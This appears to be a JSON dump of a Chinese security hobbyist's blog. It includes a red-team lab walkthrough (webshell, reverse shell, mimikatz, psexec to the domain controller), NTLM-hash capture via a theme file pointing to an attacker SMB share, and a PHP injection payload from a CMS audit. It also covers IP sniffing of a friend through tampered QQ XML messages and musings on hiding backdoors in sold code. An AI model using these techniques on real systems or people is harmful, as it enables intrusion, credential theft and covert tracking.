[{"title":"ATT&CK实战系列-红队评估（五）靶场笔记","date":"2021-06-12T12:04:56.903Z","url":"/2021/06/12/ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%BA%94%EF%BC%89%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%BA%94%EF%BC%89%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/","categories":[["undefined",""]],"content":"ATT&amp;CK实战系列-红队评估（五）靶场笔记内网相关不太熟，于是最近没事找了几个靶场练手，这里把过程记一下。也不算wp，只能算随手记吧，有不详之处各位自行琢磨，都没什么难度的。 靶场连接 概况：虚拟机密码win7 sun\\heart 123.com sun\\Administrator dc123.com 2008 sun\\admin 2020.com Win7双网卡模拟内外网 网络192.168.135.0/24192.168.138.0/24 域网络 靶机部署先启动win2008 DC主机再启动win7win7主机C盘下启动phpstudy（提示需使用管理员）sun\\Administrator dc123.com 正文首先访问win7主机80端口，发现存在web。web为thinkphp，并且此版本存在RCE漏洞。 按照习惯爆下路径，发现存在add.php特殊文件，访问发现是一个后门，可以进行密码爆破。 这里就有两条解法了。一是通过thinkphp写马，二是爆破后门密码进行操作。 我这里走的是爆破后门，TP漏洞可自行百度。 原本使用dirb，结果并没有扫到东西。后更换了dirsearch才有东西。有时候字典很重要，或者多换几个工具都是可以的。burp抓包进行爆破，用了当初豫剑会议搞的字典爆破获得密码admins，然后登录发现这个马并不是很好用，于是转而传冰蝎上马。获取相关信息利用冰蝎自带的反弹shell功能弹一个msf的shell，然后发现马并不稳定猜测是防火墙的原因，使用命令关闭防火墙 然后发现依然无法将msf会话转到cs上，遂放弃，改而转用其他方法转会话。（这里原因未知）用web后门上传cs生成的木马，然后冰蝎弹nc到攻击机，再手动运行exe。静等一会后cs提示上线，修改sleep进行快速操作。 为了稳这里多上几个控，有spawn的有注入进程的。右击扫描端网段去发现其他主机及其服务。（扫描内网138段）然后运行mimikatz读系统里的账户密码。原本这里需要先提权，结果这里已经是管理员了，实战情况下比较少见。（成员机系统中运行了管理员权限的软件）CS切换列表，右击目标主机使用psexec进行攻击 选择刚刚读到的域管理员的账户，会话监听器选择我们另外创建的smb监听器，攻击会话随意（应为同内网的机器，这里网络简单就不用考虑了）静等一会以后DC上线 smb的会话不会一直显示，时掉时上很正常。 到此就算是拿下了全部机器"},{"title":"2021.05关于小站的一些话","date":"2021-05-18T09:00:00.000Z","url":"/2021/05/18/2021-05%E5%85%B3%E4%BA%8E%E7%AB%99%E7%82%B9%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AF%9D/","categories":[["undefined",""]],"content":"RT之前的服务商出了各种各样的意外情况，最后我的机器就这样没了。数据也没了。现在用的数据是之前宝塔爆洞的时候备份的（2020-8） 中间其实也写了几篇有含金量的文章，可惜就这么没了。隐约就记得一点内容，就大致写上吧，可能还有一些东西已经彻底忘了，那就没法办法喽。 总之思来想去最后还是选择了使用github+hexo，没什么优点，唯独省心。 很感谢还有朋友一直关心着我，等着我回来。 从typecho迁移真是千辛万苦，一篇篇文章手动搬运。从17年到21年，虽然文章不多，但每篇都是自己的心血。从第一篇搬到最后一篇，仿佛自己重新经历了一次这段人生，种种感慨。最后又看了看删除了一些年少轻狂时写的胡言乱语。停下码字的手稍微想了下，今年自己都二十五六了，也不能总是这么幼稚。 进后稍微成熟点吧 就这样 2021.05.18"},{"title":"（丢失文章）剑鱼BBS后台XSS组合拳获取数据库文件","date":"2021-05-16T16:00:00.000Z","url":"/2021/05/17/%EF%BC%88%E4%B8%A2%E5%A4%B1%E6%96%87%E7%AB%A0%EF%BC%89%E5%89%91%E9%B1%BCBBS%E5%90%8E%E5%8F%B0XSS%E7%BB%84%E5%90%88%E6%8B%B3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6/","categories":[["undefined",""]],"content":"本文章详细已丢失 CNVD-2020-47676+CNVD-2020-47675一个是后台xss，一个是数据库备份文件未授权下载。 就这样，懂得都懂"},{"title":"（丢失文章）VMware-vCenter_poc","date":"2020-10-13T16:00:00.000Z","url":"/2020/10/14/%EF%BC%88%E4%B8%A2%E5%A4%B1%E6%96%87%E7%AB%A0%EF%BC%89VMware-vCenter_poc/","categories":[["undefined",""]],"content":"本文详细已丢失，只留了脚本 github"},{"title":"初探基于windows主题的哈希传递攻击","date":"2020-09-22T09:43:00.000Z","url":"/2020/09/22/%E5%88%9D%E6%8E%A2%E5%9F%BA%E4%BA%8Ewindows%E4%B8%BB%E9%A2%98%E7%9A%84%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/","categories":[["undefined",""]],"content":"近期看到嘶吼发的一篇文章 很感兴趣，于是决定试一试。根据文章中所说的信息进行了复现，记录一下复现过程。 复现过程 攻击机：kali 192.168.233.128 靶机：win server 2012 192.168.233.130 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win10 192.168.233.1 首先制作恶意主题包 右击桌面，选择到主题，选择已应用的主题，右击导出主题文件 . 导出文件为deskthemepack后缀。使用压缩文件打开该文件获得theme文件 用文本编辑器打开theme文件，来到[Control Panel\\Desktop]块下面，找到Wallpaper参数。利用地点就在这里。这里规定了壁纸的引用地址，可以是本地文件也可以是一个网络地址。而网络地址又支持多种协议。所以就功能来讲确实不算是漏洞，微软拒绝修复也很正常。 我们将Wallpaper的值设置为一个SMB共享文件 192.168.233.128\\a\\shell.png&nbsp; &nbsp;(攻击者开启的smb服务) 然后保存。进入kali开启smb服务。我们可以使用impacket进行快速搭建服务。impacket具体用法请自行百度 impacket-smbserver a pwd 如果失败记得加上sudo 开启成功后模拟被害者操作 双击theme文件安装主题,这个时候kali里面就会收到用户的凭据信息 注意：SMB服务器一定要在正常运行，不然靶机会桌面无响应。 这就是整个攻击流程。其实最本质的思想就是在一些无需授权的功能处访问无密码smb资源时会默认传递系统自己的凭据信息。将这个思路扩大还有其他玩法。比如近些年火热的动态壁纸软件wallpaper engine也有一个外部资源访问的功能 这个也可以利用 还有什么呢？其实html也可以。正好在win server 中没有主题这个玩意，于是便可以利用html进行攻击 访问恶意html文件 smb服务器同样收到了凭据信息 至此两台靶机全都攻击成功。 最后想一想其实可以攻击的手段还有很多，只要是远程资源，自动访问，都可以进行这个攻击。但是在实验时发现了问题，445端口在网络运营商那一层就被屏蔽掉了，据说是为了防御永恒之蓝。win系统又不支持非标准smb访问，所以这个手法在国内大概只能用于内网了吧。国外环境因为复现麻烦就没再尝试。 END"},{"title":"宝塔面板pma未授权访问验证POC","date":"2020-08-26T01:29:00.000Z","url":"/2020/08/26/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFpma%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%AA%8C%E8%AF%81POC/","categories":[["undefined",""]],"content":"宝塔2020/8/23–7.4.2版本验证poc py练手 验证url暂时不支持例如&nbsp;www.baidu.com:123&nbsp;这种 支持类型&nbsp;  ; www.baidu.com 2020/8/26 更新批量脚本line.py,支持批量扫描。数据列表文件为ip.txt &nbsp;由于网络原因失败回显可能会混乱，请多次扫描以确定结果 #本工具仅为技术研究使用，请勿用于非法 github: 由于门槛利用较低危害过大，小伙伴们抓紧升级"},{"title":"记burp使用的一些坑","date":"2020-06-08T08:14:00.000Z","url":"/2020/06/08/%E8%AE%B0burp%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/","categories":[["undefined",""]],"content":"刚刚换了新电脑，重新安装一堆东西，装到burp的时候遇到了坑，在此记一下 浏览器： 360激素浏览器 Edge浏览器 IE浏览器 burp版本：v2020.2.1 首先是遇到了无法导出证书。代理成功并且可以抓包，但就是无法访问页面。后来又想可能是360魔改浏览器地方太多导致的bug，于是切回edge访问（毕竟亲儿子）。设置代理后依然无法访问。 解决方法： 一、internet选项设置代理后使用IE浏览器访问。（虽然不情愿但它就是行） 二、使用burp本身自带的导出功能直接导出。 （导出时记得改下后缀） 第二个问题是证书导入成功后不生效 这问题以前也遇到过，后来莫名其妙就好了。不过确实是个问题于是仔细研究了研究。最开始以为是这个的问题 不过清除了以后并没有效果 多次检查证书的位置也没问题，确实是在信任区。最后终于找到了“视野盲区”，证书列表里面竟然有两个portswigger ca，两个一摸一样的，但是一个可以删除一个删除选项是灰的。于是猜想不能删的可能是最开始某些情况下被装上去的（可能是某种bug），第二个是自己又安装的。所以问题应该是那个不能删除的证书。 解决方法： 运行cmd，输入mmc 选择添加个管理单元，在里面添加证书选项。 在这个里面就能删除无法删除的证书了 删除之后再按常规证书安装方法走一遍就行了（我是先添加到中间证书再导出再安装到信任证书） 就这样 越往后写越想省略，咕咕咕！ 2021 再加一个。新版burp抓包后正文可能出现漂移现象。大多数人是通过调整字体及大小改善的，但那治标不治本。正确的方法应该是进入到JAVA（或者JRE）中，右击java.exe or javaw.exe ，选择兼容选项，修改取消dpi缩放，下来选择为系统选项。"},{"title":"记一次久草CMS审计","date":"2020-03-16T12:10:00.000Z","url":"/2020/03/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B9%85%E8%8D%89CMS%E5%AE%A1%E8%AE%A1/","categories":[["undefined",""]],"content":"最近隔离闲的无聊，实在没什么事情就开始想练练审计 想了想因为一直都非常好奇h站的运行模式，于是目标就锁定在了h站的程序上。 这种视频站的源码能教出名字的其实一共也没几个，之前还有苹果和海洋，现在好像这两个已经因为国内打击盗版而死亡（转入地下）了。所以我其实也就只知道剩下的久草了。 说实话以前我以为久草也是视频站程序，只不过被巧妙的利用罢了。然而当我第一次打开他的官网论坛的时候就被震惊了。 光明正大的ghs （本图为官方提供模板） 不管了，把源码下下来开始审计 这里下了最新的版本 (官方提供的结构说明) 拿到源码，放到phpstudy里，首先去安装，然而没有找到常见的install目录。看了看说明发现根本就不用安装，这个时候就疑惑了。不用安装，那它的数据是存在哪里的呢？ 直访问首页，发现视频什么的都有了，猜测是直接向远程获取的（这也解决了视频存储问题，我就说那些小电影站不可能把文件全放本地） 开始干 首先用Seay审计打开 先自动审计一下，按照预置规则来，应该不会漏下什么 首先要找漏洞，我们就要找“大”的。所以理所当然的找前台漏洞，想了想这网站的性质来说也不会有什么交互，直接找注入吧。找了一会发现整个程序根本就是无SQL化。SQL注入扑街~~ 不过在找到时候发现了它用户认证的方式 /JCSQL/Admin/Security/AdminUser.php 这个文件里存放了用户账号密码，充当了数据库的作用。以文本形式保存不会出现SQL注入的风险，以PHP的形式存在，又能避免被下载。妙啊~ 然后看看你第三行，顾名思义是IP过滤。 后台里还真就有这个功能 那么问题来了，当我们修改信息的时候其实就是读写了文本。而文本又是以php存在的。那么，如果我们插入适当的payload，其实就可以直接形成任意文件读写。好了，我们再来看一看。IPPASS的传值 好的，直接字符串写入了。并没有其他的安全函数进行过滤。这个程序本身存在一个过滤函数。 经典防护 （好像还有一个什么函数，结果写文章时找不到了） 那么我们来利用这个任意文件读写漏洞。我们的目标是AdminUser.php文件，首先通过浏览器访问，看看是否403之类的。访问后出现空白，说明可以任意用户访问，但是无显示内容（代码就三行，也真没显示的东西） 回到后台，在白名单处填写我们的payload 结合代码原来的样子，我们应该闭合第一个单引号，然后插入我们的代码，再闭合后面的单引号和括号之类的。 大致来说就是这么个格式‘);payload; //‘127.0.0.1 加入我们想写入一个文件： ‘);$myfile = fopen(“1.txt”, “w”) ;$txt = “奥里给”;fwrite($myfile, $txt); //‘127.0.0.1 写入完成后再访问一下AdminUser.php，让代码执行。然后访问同目录下的1.txt即可看到奥力给 到这里基本就完了，因为这个cms太小了，结构简单并且巧妙，没什么好玩的了。 最后再来一个反射xss 自动审计搜索出三个XSS可疑点 我们点进去第一个看一看 可以看到再script的src里直接输出了GET参数Play 那么同样的直接构造即可，姿势太多了 访问这个文件的时候只要加上参数XXXX.PHP?Paly=payload 即可 &nbsp; "},{"title":"看我如何通过QQ嗅探对方 IP","date":"2020-03-04T12:13:00.000Z","url":"/2020/03/04/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87QQ%E5%97%85%E6%8E%A2%E5%AF%B9%E6%96%B9%20IP/","categories":[["undefined",""]],"content":"注意：本文仅是技术讲解，并非利用方法。技术虽好，请勿用于违法。 首先我们要知道什么是 xml 消息。在 QQ 聊天框里，除了文字和图片以外的东西，几乎都是 xml 消息。比如最近很火的“消息回执”、“网警巡查”、“虚假红包”等等。它们通过 xml 实现了在QQ内的特殊消息显示。 重点来了（敲黑板） 那么 QQXML 消息和 IP 探测有什么关系呢？ 我们平时是不是见过这种消息：&nbsp; 这个消息有标题有内容，还有一个封面图片。这时候我们提取这个消息的 XML 代码: 我们看到这段代码里有两条链接。一个是 url ，即这篇文章的地址，点击以后 QQ 就用浏览器访问了这个网址。另一个是 cover，这篇文章的封面图片。 我们注意到，图片是自动加载的。当我们收到这条消息的时候，会自动显示这张图片。也就是说，只要在有网络的情况下，我们的 QQ 就会自动”访问”这个图片，不受我们自己控制。 而我们都知道，当访问一个网络资源的时候服务器日志上是会记录一些信息的，也就是 http 请求信息。通过日志查看请求信息，我们可以知道访问者的 IP 、 UA 等等信息。 那么，如果这个 XML 消息中的图片被篡改了呢？ 现在，让我们把 XML 代码中的图片替换掉。随意替换成什么都可以，但只要是在 cover 那个位置，QQ 都会主动去”访问”它。 替换完成后，想办法把 XML 消息，通过 QQ 发送给目标，然后我们再去服务器日志中查看信息，就可以得到对方的 IP 以及 UA 。通过 IP 可以知道对方的位置，通过 UA 可以得到对方的设备型号。 接下来，我们来实战，目标就是我们不务正业的奶凶少女曦。 首先我们准备一个XML消息，找一个最常见的，就百度吧（不容易被怀疑）。在 QQ 里访问百度，然后分享出去，这样我们就能很快的得到一个XML消息。 然后提取修改，将 cover 修改为自己服务器上的资源。这里我用了 ceye 作为代替（因为我穷并且懒），填上自己的 ceye 地址： 将修改后的 xml 消息发送给对方，静等几秒后撤回。（静等几秒是为了让对方加载完成。撤回因为图片可能会多次被访问，造成信息混乱）&nbsp; 这个时候图片加载不出来了，因为 XML 里面的 cover 有问题，自然显示不了。 最后进入到 ceye 的后台，查看 HTTP Request 选项。&nbsp; 可以看到最上面最新的那个是萌曦的信息。下面的比较早，那个是自己的。因为 xml 消息自己肯定是第一个加载完成的。然后我们拿着 IP 和 UA 去查询。IP 查询结果这里我就不说了。看 UA，百度了一下。&nbsp; 啧啧啧（你们去查查我的是什么设备，知道我有多贫穷了吧。 实战到此结束。 最后的话： 其实这些操作，都是可以进一步优化，实现更舒畅的效果。 比如不使用 ceye，这玩意隔三岔五崩溃，用着实在心累。 比如通过某种手段将 php 当成图片，这样就能制作一个完美的私人嗅探系统。 比如使用高精度 IP 定位，精确到街道等级，我就可以在放学路上拦截少女了（贱笑 文章首发朋友的公众号&nbsp;&nbsp; 请大家多多支持&nbsp;&nbsp;"},{"title":"C#学习副产物--编码助手（本地编码小工具）","date":"2020-01-13T12:51:00.000Z","url":"/2020/01/13/C#%E5%AD%A6%E4%B9%A0%E5%89%AF%E4%BA%A7%E7%89%A9--%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8B%EF%BC%88%E6%9C%AC%E5%9C%B0%E7%BC%96%E7%A0%81%E5%B0%8F%E5%B7%A5%E5%85%B7%EF%BC%89/","categories":[["undefined",""]],"content":"最近开始学习C#了 起因是有天夜里突然想到总结一下自己这些年都有什么成果，结果总结了总结发现目前为止自己写的所有东西都是黑框框（web除外）。又想了想自己都会什么语言，发现自己根本没有会一种“沉稳”的语言。于是乎就就结合自己的情况决定学习C# 我个人觉得学习新语言嘛，看视频看书是最慢的。我一般都是先看文档，了解这个语言的大致基础“规则”。然后给自己定一个小项目。马上开始动手进行，即使是面向百度也无所谓。动手实践比什么都强。 于是我就写了一个编码转换工具，因为有时候所处的环境没有网络，无法使用在线工具，及时有网络再去寻找这些工具也是需要时间。所以正好借这个机会自己给自己写一个。 代码内容并不难，更能综合锻炼自己的学习能力 界面 &nbsp;&nbsp; 甚至为自己自豪的添加了声明 百度网盘： 链接：; 提取码：ks9m复制这段内容后打开百度网盘手机App，操作更方便哦 github有时间再传，电脑没电了，关机睡觉"},{"title":"学习副产物--编码助手（本地编码小工具）","date":"2020-01-13T12:51:00.000Z","url":"/2020/01/13/%E5%AD%A6%E4%B9%A0%E5%89%AF%E4%BA%A7%E7%89%A9--%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8B%EF%BC%88%E6%9C%AC%E5%9C%B0%E7%BC%96%E7%A0%81%E5%B0%8F%E5%B7%A5%E5%85%B7%EF%BC%89/","categories":[["undefined",""]],"content":"最近开始学习C#了 起因是有天夜里突然想到总结一下自己这些年都有什么成果，结果总结了总结发现目前为止自己写的所有东西都是黑框框（web除外）。又想了想自己都会什么语言，发现自己根本没有会一种“沉稳”的语言。于是乎就就结合自己的情况决定学习C# 我个人觉得学习新语言嘛，看视频看书是最慢的。我一般都是先看文档，了解这个语言的大致基础“规则”。然后给自己定一个小项目。马上开始动手进行，即使是面向百度也无所谓。动手实践比什么都强。 于是我就写了一个编码转换工具，因为有时候所处的环境没有网络，无法使用在线工具，及时有网络再去寻找这些工具也是需要时间。所以正好借这个机会自己给自己写一个。 代码内容并不难，更能综合锻炼自己的学习能力 界面 &nbsp;&nbsp; 甚至为自己自豪的添加了声明 百度网盘： 链接：; 提取码：ks9m复制这段内容后打开百度网盘手机App，操作更方便哦 github有时间再传，电脑没电了，关机睡觉"},{"title":"phpstudy后门exp","date":"2019-09-25T08:41:00.000Z","url":"/2019/09/25/phpstudy%E5%90%8E%E9%97%A8exp/","categories":[["undefined",""]],"content":"前阵子phpstudy爆了后门，网络安全周爆的呢 影响版本phpstudy 2016版PHP5.4 据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测 据传言这个也存在 现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp 看了很多个exp代码又复杂又不好用，最后决定自己写一个试试 看了看其实就是报文里有两个属性字段被修改了，其他正常发包即可 首先用burp试了试，复现失败，没有返回命令内容 后来无意中发现把Accept-Encoding后面属性deflate最前面的空格去掉即可 命令：echo “111111111111111”; （1处deflate前面去掉一个空格，2处为命令内容b64编码） 复现成功 python写一个 直接运行系统命令 但是这个后门本质是运行php代码 因为我写的第八行所以只跑了系统命令 输出部分本来想美化，后来发现会影响回显遂放弃github 本文章已经所附代码仅供技术研究，请勿用于其他用途"},{"title":"phpstudy中Apache无法启动问题","date":"2019-07-12T11:55:00.000Z","url":"/2019/07/12/phpstudy%E4%B8%ADApache%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/","categories":[["undefined",""]],"content":"使用phpstudy时其中Apache无法启动，点击启动后再次自动关闭 在网上查了很多资料，有的说是端口占用、有的说是程序冲突 也有说vhost出错的，当然这几个确实可能导致这种问题 但是最后解决却是在httpd.conf中 进入到Apache的目录中手动用cmd启动 查看报错文件信息httpd.conf第223行 文件在Apache\\conf\\下 . 第223行路径最后多了一个“\\”，去掉以后再重新启动Apache。现在服务已经可以正常启动了 最后提一下，这个问题往往由于更换web目录时偷懒造成的。 正常操作是点击“打开”选择路径然后应用，但是偷懒的人会直接在前面的路径框里修改然后应用，这个时候往往会在路径最后留上一个\\，于是就报错了"},{"title":"菜鸡练手---表白墙","date":"2018-12-19T08:00:00.000Z","url":"/2018/12/19/%E8%8F%9C%E9%B8%A1%E7%BB%83%E6%89%8B---%E8%A1%A8%E7%99%BD%E5%A2%99/","categories":[["undefined",""]],"content":"冬天了，又到了白色…..又到了恋爱的季节 没有女票的我闲着蛋疼做了一个表白墙程序，放到github冒充项目…. 原生php撸程序真的好累….我想学tp… 程序并不复杂，全部用原生写的。对php初学者应该很有用。 前端使用bs布局，还有一些想不起来的地方可能大概用了layui… 首页留言每次刷新布局都会变化，使用随机数让bs栅格随机 登陆界面本来不是这样，忘了改了什么变成这样了…不就修了 后台暂时是这样的，我喜欢干净…至于为什么没有分页,,,懒得弄。到时候看看github上的版本有没有吧，如果我还填坑的话… 总之就是这样，安全性不怎么样。就加了一个360防护，输入过滤之类什么都没有 GITHUB:"},{"title":"记一次反盗版胜利","date":"2018-11-03T14:20:00.000Z","url":"/2018/11/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E7%9B%97%E7%89%88%E8%83%9C%E5%88%A9/","categories":[["undefined",""]],"content":"七月份左右的时候我鼓鼓捣捣终于完成了自己的第一个练手作品，二维码活码系统。抱着卖一个赚一个的心态就挂到了淘宝上。没过多久就有人购买，当时我当然是非常开心。 直到对方说了一句话：以后有好的源码请联系我… 有好的源码请联系我… 源码请联系我 … 请联系我…&nbsp; 我…&nbsp;&nbsp; 突然觉得事情没那么简单…不过当时因为正在旅游所以转脸就给忘了。 直到今天突然想把程序放到专业的源码出售平台上，没多想直接进入了百度第一个网站 进入网站后就想到了当初旅游时发生的事，于是就搜了一下。 还不止一家呢… 卖的比我还贵（捂脸） 其实说实话，如果当时买的时候你就给我说明要倒卖，再随意加点钱就能把我给打发了。但你没说过啊，写代码的最厌恶这种行为了。 所以…那不行啊，这就是盗卖了，别怪我不客气 于是找到网站客服交流： 虽说没有提供太有力的证据，不过已经在处理，可以算是阶段性胜利了。 经过这件事我结合周围发生的事（比如DGG事件），于是想了想如何才能防止盗版。最后得出结论，在没有巨大投资的情况下几乎不可能实现杜绝盗版。但是也有一些方法可以起到一些作用。防不住一百个人，防住五十个也不错。 1、授权系统 网站程序防盗必定离不开授权系统，这也是市面上最常用的防盗方式。 ①激活码授权 出售激活码，将激活码写入到指定文件。当网页运行的时候激活码将会远程发送到服务器验证端。验证端在数据库中查询激活码是否存在（可以加上域名验证），通过最简单的if语句即可实现功能。之前在其他文章里也提到过这个想法：《一个简易授权demo》 （不能防止激活码重复使用） ②单号验证+代码混淆 每次出售的源码都不同，和上一个方法类似将交易单号插入到某个文件（重要文件，比如数据库连接文件）。然后对代码进行加密混淆。每次网页运行后远程服务端便记录运行单号和域名。若出现同一单号运行在两个域名则终止程序运行。 （手动修改太麻烦，不适合懒癌患者） 2、后门 ③后门 这是用户最讨厌也是开发者最喜欢的手段。用户讨厌是因为后门指不准能走到哪。开发者喜欢是因为…它真的很爽啊~ 和以前黑别人网站比起来自己“黑”才是真的爽啊~ 想插哪就插哪，想怎么动就怎么动。插上去后还能再加个密啥的….不行不行老毛病又要犯了，淡定淡定。 用多个文件进行拼接，某些部分混淆加密一下，呵呵哒~ 顺便返回下域名 菜刀直接莽，不怂 （太缺德，而且没有识别手段） 总之先想到这么多，以后再有新操作再加上来。"},{"title":"博客一周年纪念","date":"2018-09-15T12:05:00.000Z","url":"/2018/09/15/%E5%8D%9A%E5%AE%A2%E4%B8%80%E5%91%A8%E5%B9%B4%E7%BA%AA%E5%BF%B5/","categories":[["undefined",""]],"content":"怎么说呢，这篇文章写得有点迟了。本来昨晚就该写的，结果咕咕咕战胜了理智。 看着站底部的时间才发现原来已经开站一年了，一年里认识了很多大神，学会了很多东西，交了很多朋友。一年中不管遇到什么，总算是磕磕碰碰走过来了。第一次做一个站坚持这么长时间。(有机会考虑考虑十年之约) 诶，中间吃了顿饭写文章的灵感全没了。就这样吧。（看来以后写东西中间不能断啊） 虽然没几个人看这个破站，但是还是要自己庆祝一下。 一周年快乐！ . 一周年快乐！ 一周年快乐！ 一周年快乐！ 一周年快乐！&nbsp; 一周年快乐！&nbsp;&nbsp; 一周年快乐！&nbsp; 一周年快乐！&nbsp;&nbsp;"},{"title":"WTS气泡通知插件","date":"2018-09-10T12:33:00.000Z","url":"/2018/09/10/WTS%E6%B0%94%E6%B3%A1%E9%80%9A%E7%9F%A5%E6%8F%92%E4%BB%B6/","categories":[["undefined",""]],"content":"前阵子蚊子大佬写了个气泡通知，觉得很好玩。 所以就想用在自己的站上，然而扒了半天眼睛都疼了也没干净的扒下来。 幸好有其他大佬扒了下来，自己正好简化下做成typecho插件（懒癌发作） 由于是第一次做插件，有什么做的不好的地方….那就不好着吧 反正我也不一定会修那个bug 效果图： 放上github地址:点击进入 WTS##气泡公告插件 ##模仿ACFUN通知条 插件名叫WTS(蚊子、兔子（梓喵）、阿硕) 启用插件后访问网站首页时会在左侧弹出一个仿ACFUN通知条，一段时间后向下滑动消失。 大部分代码来自@梓喵&nbsp;核心代码来自@蚊子 我个弱渣只是稍微改了改然后撸成插件（有些奇奇怪怪的代码因为不知道干嘛的就没有删掉） 默认颜色是红色，需要改的可以在zi_message2.js的第21、22、23行更改。后台改颜色什么的以后再说吧。 解压后文件夹记得改名为WTS(大写) 2018.9.18 发现插件存在兼容性问题，本博客暂时取消展示 2021.5时间太长了，当年写的代码是啥都忘了，已经无法填坑…遂弃。感谢一直以来大家的喜爱"},{"title":"有缘，江湖见","date":"2018-09-05T07:50:00.000Z","url":"/2018/09/05/%E6%9C%89%E7%BC%98%EF%BC%8C%E6%B1%9F%E6%B9%96%E8%A7%81/","categories":[["undefined",""]],"content":"来学校早了，整天闲得无聊。今天十二点半才醒来，无聊拿着手机看QQ。看到班级群里好像有什么消息，点开看了看…. 一个兄弟好像不准备回来了。博主今年已经大三了，因为上的专科学校所以正常情况下大三就该出去实习。有些人暑假之后就会不来学校直接实习去，一年后领毕业证就一切都结束了。 一直以为三年时间很长，没想到一眨眼就过完了。你问我大学都干了什么，我不知道。我快乐吗？也没感觉到。你有挥洒过青春和梦想吗？可能有吧。那你后悔上大学吗？不…一点也不后悔。即使我的学校不入流，即使我的学校很无趣，但依然不后悔。在这里我遇到过有意思的人，遇到过没意思的人，遇到过错误的人，也遇到了正确的人。我干过蠢事，也当过英雄。崇拜过学长，也被叫过学长。被学姐撩过，也被学妹撩过（大雾~） 听着窗外社团纳新的声音，好像自己入学就是昨天。 学校还是那个学校，社团还是那个社团。商学院大道依然热闹，建工楼依然是个迷宫，地上的黑砖还是那么滑。英才广场的喷泉依然是一年喷一次水，而我可能是最后一次看到了。 有缘，江湖见"},{"title":"终于加上小绿锁","date":"2018-09-03T13:53:00.000Z","url":"/2018/09/03/%E7%BB%88%E4%BA%8E%E5%8A%A0%E4%B8%8A%E5%B0%8F%E7%BB%BF%E9%94%81/","categories":[["undefined",""]],"content":"前几天在某大佬群里水的时候大家无意间提到了小绿锁（https）都在说自己用了什么什么协议用的哪里哪里的证书。于是弱弱的问了一句：“大佬们都是上了锁吗？” 于是就被鄙视了。 其实我个人是懒的去上锁的，当初https大范围应用时全网速度都下降了一个层次。（后来证实是上游DNS被攻击的缘故）所以对上锁有点抗拒。说是更安全，其实我觉得没什么用处。有人想办法赚钱就有人想办法偷钱，过于在意没什么意义。但是现在大家都上了那我就也跟随大众吧（据说谷歌现在都划标识了）。 自己一直用的amh面板，平时实验多所以环境装的很乱。加小绿锁时遇到了很多问题，所以写篇文章来纪念下我死去的脑细胞。 申请证书之类的都和网上大多一样，这个过程就不说了。 拿到了证书文件之后在amssl里配置。遇到的第一个问题是模块使用问题。 这里需要先填写数据然后创建，才能填CSR数据。（不能一次性提交，差评） 第二个坑，应用证书是失败，提示&nbsp; nginx: [warn] conflicting server name &quot;sshuo.cc&quot; on 0.0.0.0:80, ignored 想不通是为什么，百度上查大多是说nginx配置问题，但是检查了并没有什么错误。 后来突然想起来以前的旧博客其实并没有删除，只是把它放到其他环境并且不解析了。那就对了。打开看了看果然那个旧的博客上还绑着sshuo.cc这个域名。因为域名冲突所以才会提示这个错误，删了之后果然就可以了。 第三个坑，cdn设置。因为没配过小绿锁所以不知道cdn是需要特殊设置的。我用的阿里的CDN，在控制台找了半天终于找到HTTPS设置。需要上传你的证书。我是在amh直接获取的，在阿里这里填的时候没注意顺序死活填不对。冷静下来后慢慢仔细的看，才发现两个地方给的顺序不一样。amh先给的私钥，阿里那边是先填的公钥，两个弄反了所以总是失败。（如果服务器上设置了强制跳转阿里那里就别设置了，会出问题的） 第四个坑，资源链接重写。当你配完以上步骤时网站已经可以正常访问了。然而访问时你的资源都丢了（图片、视频、js、css…） 因为你的资源链接都没改，所以无法访问。这时候基本改两个地方就行了。登上你的后台，在网站的基本设置里更改网站地址，把http改为https就好了。 然后进入到数据库执行一个sql语句(以tyoecho为例)： 执行后文章中的所有引用链接就全都加上了https，正常访问get 其实到这里就基本结束了，以下两个坑是我自己的，正常人应该遇不到。 加上锁以后顺手换了主题，结果发现主题css丢了一些。可是各种找问题找不到，最后仔细想了想大概是CDN和DNS的锅。 用户访问域名需要通过DNS解析然后找到资源，而CDN则把资源“预存”到了各个节点上去。那么问题就出现了，资源不可能实时更新“预存”，而DNS也需要时间去同步。当我因为加了小绿锁重新配置了CDN后CDN节点开始“预存”资源，并且DNS开始将访问请求通过CDN提供的CNAME解析把请求分配到各个节点，然后各个节点开始和全球进行同步。最后就出现了CDN刷新时间+DNS同步时间=我睡一觉的时间。所以就出现了我这个“反应迟钝”，没想通的时候以为站炸了，其实只是没刷新过来而已。 最后吐槽一句：学校自有DNS真的辣鸡"},{"title":"一个二维码活码系统思路","date":"2018-08-31T08:45:00.000Z","url":"/2018/08/31/%E4%B8%80%E4%B8%AA%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%B4%BB%E7%A0%81%E7%B3%BB%E7%BB%9F%E6%80%9D%E8%B7%AF/","categories":[["undefined",""]],"content":"习惯放图 